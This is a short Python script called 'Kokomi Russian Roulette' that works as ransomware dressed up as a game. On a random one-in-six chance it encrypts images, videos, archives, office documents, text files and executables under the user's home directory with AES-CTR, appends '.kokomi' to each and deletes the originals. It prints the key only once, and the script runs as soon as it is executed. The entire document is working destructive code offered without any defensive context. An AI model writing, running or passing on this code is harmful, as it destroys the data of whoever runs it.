#Kokomi Russian Roulette version 0.1
import os
import random
import glob
import secrets
import string
import pyaes
from base64 import b64encode

def kokomi():
    ransomExt = ".kokomi"
    fileExtensions = [".jpg", ".png", ".mkv", ".mp4", ".zip", ".rar", ".m4a", ".mp3", ".pdf", ".docx", ".pptx", ".xlsx", ".txt", ".exe"]
    bullet = random.randint(1,6)
    if 1 == bullet:
        print("You are dead")
        key = os.urandom(16)
        token = b64encode(key).decode("utf-8")
        print(token)
        userdir = os.path.expanduser('~')
        for path in fileExtensions: 
            for file in glob.glob(f'{userdir}/**/*{path}'):
                #read files
                with open(file,"rb") as f:
                    data = f.read()
                    #print(data)
                    f.close()
                #Create new file
                encfile = file + ransomExt
                aes = pyaes.AESModeOfOperationCTR(key)
                kenc = aes.encrypt(data)
                with open(encfile,"wb") as nf:
                    nf.write(kenc)
                    nf.close()
                os.remove(file)
    else:
        print("You are save")
kokomi()
